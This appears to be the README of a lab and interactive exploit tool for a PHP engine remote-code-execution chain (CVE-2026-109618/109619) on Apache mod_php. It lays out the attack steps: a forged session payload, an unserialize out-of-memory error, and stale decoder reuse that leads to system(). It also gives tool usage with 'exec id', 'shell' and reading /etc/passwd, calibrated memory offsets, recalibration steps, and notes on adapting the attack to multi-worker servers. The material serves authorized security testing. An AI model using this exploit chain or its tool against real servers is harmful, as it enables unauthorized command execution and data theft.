# PHP2SHELL — mod_php lab

Engine-level PHP2SHELL chain (CVE-2026-109618 / CVE-2026-109619) ported to
Apache + mod_php (prefork), with a single interactive exploit tool.

```
php2shell-lab/modphp-lab/
├── Dockerfile              php:8.3.33-apache + gdb (gdb only for calibration)
├── php.ini                 16M memory limit, upload progress enabled
├── apache-single.conf      prefork, one child, keep-alive
├── app/
│   ├── index.php           @unserialize($_POST['data'])  — A side
│   └── store.php           session payload delivery
├── run.sh                  build/start the lab on 127.0.0.1:18130
├── modphp_shell.py         ← the one interactive exploit tool
├── cal_modphp.gdb          calibration probe (lab only)
├── CALIBRATION.md          offsets, chain notes, recalibration procedure
└── evidence/               gdb trace, uid proof, tool transcripts
```

## Status

The lab is up at `http://127.0.0.1:18130` and the chain is reproduced:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Calibrated for the current prefork master:

```text
D          = 0x7fdb5ca6c000
system     = 0x7fdb5f919090   (libc system offset 0x53090)
struct_off = 0x1fe8
```

## Quick start

One command:

```sh
python3 modphp_shell.py --exec 'id'
```

Interactive:

```sh
python3 modphp_shell.py
```

```text
php2shell(modphp)> exec id
[*] store ... 200 STORED pid=251 len=65500
[*] A (unserialize OOM) ... 500
[*] B (upload-progress decode) ... connection dropped (expected)
[*] output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

php2shell(modphp)> exec uname -a
php2shell(modphp)> shell
php2shell(target)> cat /etc/passwd | head -3
```

Each `exec` runs the complete store → A → B cycle. B aborts the Apache child
after `system()` returns; the prefork master respawns it and the next command
works. The tool is pure HTTP; gdb is only used for lab calibration.

## How it works (short version)

1. `store.php` writes a 65500-byte session value and aliases it, producing
   `p|s:65500:"<payload>";upload_progress_fk1|R:1;`.
2. A (`index.php`) triggers a post-RINIT OOM inside `@unserialize()`. The
   bailout leaves `BG(unserialize).level = 1` and its data pointer dangling.
   The Apache child survives.
3. B is a multipart upload-progress request. The pre-RINIT session decode
   reuses the stale unserializer on the same child; `R:1` resolves to the
   forged zval/reference/array in the session payload.
4. The fake array's `pDestructor` is `system` and its `arData` is the command
   string, giving command execution as the Apache user.

The session read-buffer geometry is identical to the FPM lab: the session
file marker is at `D - 0x1fe8`, so the forged struct at file offset `0x1fe8`
lands exactly on the stale decoder. See `CALIBRATION.md` for the gdb trace and
the full layout.

## Lab setup

`./run.sh` builds and starts:

```text
container: f2s-apache
image:     f2s-modphp  (FROM php:8.3.33-apache)
port:      127.0.0.1:18130 -> 80
cap:       SYS_PTRACE (for gdb calibration)
```

Apache runs prefork with `MaxRequestWorkers 1`, so A and B are handled by the
same child. The target app is in `/var/www/html`; `out/` is writable by
`www-data` and is used as the command-output channel.

## Recalibration

D, `system`, and `struct_off` are per prefork master. They are stable across
child respawns while the master lives, but a container/master restart changes
them. If you rebuild the lab with `./run.sh`, use the procedure in
`CALIBRATION.md` to read the new values, then either:

- pass them on the command line:

  ```sh
  python3 modphp_shell.py --d 0x... --system 0x... --struct-off 0x... --exec id
  ```

- or set them in the REPL: `set d 0x...`, `set system 0x...`,
  `set struct_off 0x...`.

The current tool defaults match the currently running master.

## Evidence

| File | Content |
| --- | --- |
| `evidence/modphp_gdb.out` | VARTMP / RCDTOR / SYSTEM / SIGABRT trace on B |
| `evidence/modphp_uid.txt` | HTTP-fetched `uid=33(www-data)` proof |
| `evidence/modphp_id.txt` | one-shot tool run |
| `evidence/modphp_multi.txt` | three sequential commands in one session |
| `evidence/modphp_shell.txt` | `help` + `shell` mode |
| `evidence/modphp_session.txt` | 65537-byte session file layout |
| `evidence/modphp_libc.txt` | glibc 2.41 and `system` offset 0x53090 |

Key trace lines:

```text
VARTMP#1 ... d=0x7fdb5ca6c000 ... marker=('0x7fdb5ca6a018','d-8168','fileoff_if_base=0x1fe8')
RCDTOR ref=0x7fdb5ca6e180 rc=0 type_info=10
SYSTEM rdi=0x7fdb5ca6e300 cmd=rm -f /var/www/html/out/evid.txt; (id) > /var/www/html/out/evid.txt 2>&1
#5 zend_array_destroy
#6 zend_reference_destroy
#7 zend_hash_update
```

## Caveats

- A and B must hit the same Apache child because `BG(unserialize)` is
  per-process. The lab enforces this with one worker. A normal multi-worker
  prefork pool needs connection/child pinning or retries; do not assume the
  lab's single-child behavior transfers unchanged.
- B aborts the child by design (`zend_mm_heap corrupted`, exit signal Abort).
  The master respawns it; this is accounted for by the tool.
- The tool's output is a web-readable file, not a persistent shell socket.
  Each command is a fresh exploit cycle.
- Lab / authorized testing only. The app's `store.php` and OOM endpoint are
  deliberate preconditions for the demonstration.
